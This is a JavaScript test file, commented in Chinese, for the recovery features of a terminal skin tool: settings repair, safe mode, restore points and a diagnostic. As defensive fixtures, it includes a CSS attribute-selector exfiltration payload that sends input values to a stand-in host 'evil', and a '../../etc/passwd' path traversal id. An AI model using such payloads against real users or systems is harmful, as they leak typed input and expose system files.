"use strict";
/**
 * 救援机制的测试。
 *
 * 这一组比别的更重要，因为它保护的东西**只在最糟的时刻才被用到**：用户的
 * agent 把事情做坏了、而且自己也崩了。那个时刻没有人能发现"原来恢复功能本身
 * 也是坏的"。所以这里测的不是"功能能用"，是"它在被破坏过的现场里还能用"。
 */
const test = require("node:test");
const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { home, history, doctor } = require("../src/index.js");

const VARS = ":root{--color-bg:#101;--color-text:#eee;--color-accent:#0af;}";

function freshHome() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "dsh-recovery-"));
  const env = { DSH_SKIN_HOME: root };
  home.ensureDirs(env);
  return { root, env };
}
function writeSkin(env, id, css = VARS, meta = {}) {
  const dir = path.join(home.paths(env).skins, id);
  fs.mkdirSync(path.join(dir, "assets"), { recursive: true });
  fs.writeFileSync(path.join(dir, "skin.json"), JSON.stringify({ name: id, ...meta }));
  fs.writeFileSync(path.join(dir, "skin.css"), css);
  return dir;
}

/* ── 设置：坏了不能静默丢 ───────────────────────────────────────────── */

test("坏掉的设置文件先隔离再退回默认值，不是静默覆盖", () => {
  const { env } = freshHome();
  fs.writeFileSync(home.paths(env).state, "{ 这不是 json");
  const result = home.readStateDetailed(env);
  assert.ok(result.corrupt, "应该给出隔离后的路径");
  assert.ok(fs.existsSync(result.corrupt), "隔离文件要真的存在");
  assert.equal(result.state.skin, home.DEFAULTS.skin);
});

test("越界的设置被收进合法范围，并报出改了哪几项", () => {
  const { env } = freshHome();
  fs.writeFileSync(home.paths(env).state, JSON.stringify({
    rotateMinutes: 0, cursor: -5, skin: 123, shells: "不是数组", appearance: "紫色",
  }));
  const { state, repaired } = home.readStateDetailed(env);
  assert.equal(state.rotateMinutes, 1, "0 会让轮播每分钟触发一次");
  assert.equal(state.cursor, 0);
  assert.equal(state.skin, home.DEFAULTS.skin);
  assert.deepEqual(state.shells, []);
  assert.equal(state.appearance, "system");
  for (const key of ["rotateMinutes", "cursor", "skin", "shells", "appearance"]) {
    assert.ok(repaired.includes(key), key);
  }
});

test("写入是原子的：临时文件不会留下", () => {
  const { env } = freshHome();
  home.writeState({ ...home.DEFAULTS, skin: "x" }, env);
  assert.ok(!fs.existsSync(`${home.paths(env).state}.tmp`));
  assert.equal(home.readState(env).skin, "x");
});

/* ── 安全模式：一个文件就是开关 ──────────────────────────────────────── */

test("安全模式靠文件存在与否，任何人都能判断和改变", () => {
  const { env } = freshHome();
  assert.equal(home.safeModeOn(env), false);
  home.setSafeMode(true, "测试", env);
  assert.equal(home.safeModeOn(env), true);
  assert.equal(home.safeModeInfo(env).reason, "测试");
  home.setSafeMode(false, undefined, env);
  assert.equal(home.safeModeOn(env), false);
});

test("标记文件内容坏了，安全模式仍然生效", () => {
  const { env } = freshHome();
  fs.writeFileSync(home.paths(env).safeMode, "乱七八糟");
  assert.equal(home.safeModeOn(env), true);
  assert.ok(home.safeModeInfo(env).reason.includes("安全模式仍然生效"));
});

/* ── 还原点 ──────────────────────────────────────────────────────────── */

test("还原点能把被覆盖的皮肤内容写回去", () => {
  const { env } = freshHome();
  const dir = writeSkin(env, "mine", `${VARS}\n/* 原始 */`);
  const point = history.snapshot("test", "存档", env);
  fs.writeFileSync(path.join(dir, "skin.css"), "被 agent 写坏了");
  const result = history.restore(point.id, {}, env);
  assert.equal(result.ok, true);
  assert.match(fs.readFileSync(path.join(dir, "skin.css"), "utf8"), /原始/);
});

test("被删掉的皮肤能补建回来，丢失的素材图被明确报出来", () => {
  const { env } = freshHome();
  const dir = writeSkin(env, "mine");
  fs.writeFileSync(path.join(dir, "assets", "bg.png"), "图");
  const point = history.snapshot("test", "存档", env);
  fs.rmSync(dir, { recursive: true, force: true });
  const result = history.restore(point.id, {}, env);
  assert.ok(fs.existsSync(path.join(dir, "skin.css")), "文本文件要补回来");
  assert.equal(result.missingAssets.length, 1, "素材图找不回来，但必须说出来");
  assert.equal(result.missingAssets[0].name, "bg.png");
});

test("恢复永远不删东西：快照之后新增的皮肤原样保留", () => {
  const { env } = freshHome();
  writeSkin(env, "old");
  const point = history.snapshot("test", "存档", env);
  writeSkin(env, "added-later");
  const result = history.restore(point.id, {}, env);
  assert.ok(fs.existsSync(path.join(home.paths(env).skins, "added-later")), "不能删");
  assert.deepEqual(result.kept, ["added-later"]);
});

test("预演不动任何文件", () => {
  const { env } = freshHome();
  const dir = writeSkin(env, "mine", `${VARS}\n/* 原始 */`);
  const point = history.snapshot("test", "存档", env);
  fs.writeFileSync(path.join(dir, "skin.css"), "改过了");
  const dry = history.restore(point.id, { dryRun: true }, env);
  assert.ok(dry.changes.length > 0, "要报告它打算改什么");
  assert.equal(fs.readFileSync(path.join(dir, "skin.css"), "utf8"), "改过了", "但不能真改");
});

test("一个写坏的还原点只作废自己，不让整个列表不可用", () => {
  const { env } = freshHome();
  writeSkin(env, "mine");
  history.snapshot("test", "好的", env);
  fs.writeFileSync(path.join(home.paths(env).history, "9999-broken.json"), "{ 坏的");
  const points = history.list(env);
  assert.equal(points.length, 2);
  assert.equal(points.filter((p) => !p.broken).length, 1);
});

test("还原点数量有上限，不会无限堆积", () => {
  const { env } = freshHome();
  writeSkin(env, "mine");
  for (let i = 0; i < history.KEEP + 5; i += 1) history.snapshot(`t${i}`, `第 ${i} 次`, env);
  assert.equal(history.list(env).length, history.KEEP);
});

test("恢复不存在的还原点是明确的失败，不是静默无事发生", () => {
  const { env } = freshHome();
  const result = history.restore("根本没有这个", {}, env);
  assert.equal(result.ok, false);
  assert.match(result.error, /找不到/);
});

test("还原点 id 不能穿越出历史目录", () => {
  const { env } = freshHome();
  assert.equal(history.read("../../etc/passwd", env), null);
});

/* ── 体检 ────────────────────────────────────────────────────────────── */

test("干净的安装：没有 error", () => {
  const { env } = freshHome();
  writeSkin(env, "midnight-harbor");
  home.patchState({ skin: "midnight-harbor" }, env);
  history.snapshot("test", "基线", env);
  const report = doctor.diagnose({ builtinRoots: [] }, env);
  assert.equal(report.checks.filter((c) => c.level === "error").length, 0,
    JSON.stringify(report.checks.filter((c) => c.level === "error")));
});

test("选中的皮肤不存在 —— 只有在确实看得到皮肤库时才算 error", () => {
  const { env } = freshHome();
  writeSkin(env, "exists");
  home.patchState({ skin: "没有这套" }, env);

  // 命令行独跑、还不知道内置皮肤在哪：不能断言皮肤没了，那会把人引向错误方向
  const blind = doctor.diagnose({}, env).checks.find((c) => c.id === "current-skin");
  assert.equal(blind.level, "warn");

  // 知道内置皮肤在哪之后，同样的状况才是真 error
  home.recordInstall({ builtinSkins: home.paths(env).skins }, env);
  const seeing = doctor.diagnose({}, env).checks.find((c) => c.id === "current-skin");
  assert.equal(seeing.level, "error");
});

test("会外泄的皮肤被体检报出来，且说清它套不上", () => {
  const { env } = freshHome();
  writeSkin(env, "leaky", `${VARS}\ninput[value^="a"]{background:url(https://evil/?a)}`);
  const report = doctor.diagnose({ builtinRoots: [home.paths(env).skins] }, env);
  const blocked = report.checks.find((c) => c.id === "skins-blocked");
  assert.equal(blocked.level, "warn");
  assert.match(blocked.detail, /leaky/);
});

test("自动修复只做安全的事，绝不删皮肤", () => {
  const { env } = freshHome();
  writeSkin(env, "exists");
  home.recordInstall({ builtinSkins: home.paths(env).skins }, env);
  home.patchState({ skin: "没有这套" }, env);
  const result = doctor.repair({}, env);
  assert.equal(home.readState(env).skin, "none", "切成不套皮肤，而不是随便挑一套");
  assert.ok(fs.existsSync(path.join(home.paths(env).skins, "exists")), "一套皮肤都不能删");
  assert.ok(result.done.length >= 1);
});

test("每一条非 ok 的结论都要给出下一步 —— 否则非技术用户只知道坏了", () => {
  const { env } = freshHome();
  writeSkin(env, "leaky", `${VARS}\n#a{background:url(https://evil/x.png)}`);
  home.patchState({ skin: "没有这套" }, env);
  const report = doctor.diagnose({}, env);
  for (const c of report.checks) {
    if (c.level === "ok") continue;
    assert.ok(c.fix || c.detail, `${c.id} 既没有 fix 也没有 detail`);
  }
});
